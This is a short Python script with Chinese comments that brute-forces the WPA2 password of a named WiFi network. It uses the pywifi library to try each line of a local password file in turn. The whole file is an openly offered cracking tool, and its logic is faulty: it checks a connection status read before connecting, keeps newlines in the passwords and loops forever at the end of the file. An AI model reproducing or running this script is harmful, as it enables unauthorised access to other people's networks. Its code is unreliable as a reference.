# -*- coding: utf-8 -*-
"""
Created on Sun Aug  4 10:40:58 2019

@author: Administrator
"""

#想要破解WiFi密码，先导入pywifi以及所需要的常量模块
import pywifi
from pywifi import const
import time

#抓取网卡接口
#断开所有的连接
#读取密码本
#设置睡眠时间
#2.测试连接返回连接的结果
def wificonnect(str2):
    #抓取网卡接口
    wifi = pywifi.PyWiFi()
    #获取第一个无线网卡
    iface = wifi.interfaces()[0]
    #断开所有的连接
    time.sleep(1)
    #判断是否连接上网卡
    wifistatus = iface.status()
    if wifistatus == const.IFACE_DISCONNECTED:
        print("未连接")
        #创建wifi连接文件
        profile = pywifi.Profile()
        #要连接wifi的名称
        profile.ssid = "vivoY67"
        #网卡的开放
        profile.auth = const.AUTH_ALG_OPEN
        #wifi的加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        #加密单元
        profile.cipher=const.CIPHER_TYPE_CCMP
        #给文件一个密码
        profile.key = str2
        #删除所有连接过的wifi文件
        iface.remove_all_network_profiles()
        #设定新的连接文件
        new_profile = iface.add_network_profile(profile)#新连接的所有东西全部在这个profile中
        #用新的连接文件去判断是否连接
        iface.connect(new_profile)
        #wifi连接的时间
        time.sleep(2)
        if wifistatus == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else: 
        print("已连接")
    

#1.读取密码本
def readpasswd():
    print("开始破解：")
    #设置密码本的路径
    path = "C:\\Users\Administrator\Desktop\password.txt"
    #打开文件
    file = open(path,"r")#方式为只读模式
    #死循环，一直匹配直到符合要求
    while True:
        #读取文件出现错误，就跳出循环（异常检查）
        try:
            #读取一行
            str1 = file.readline()
            bool = wificonnect(str1)
            if bool:
                print("密码正确",str1)
                break
            else:
                print("密码不正确",str1)       
        except:
            continue
readpasswd()
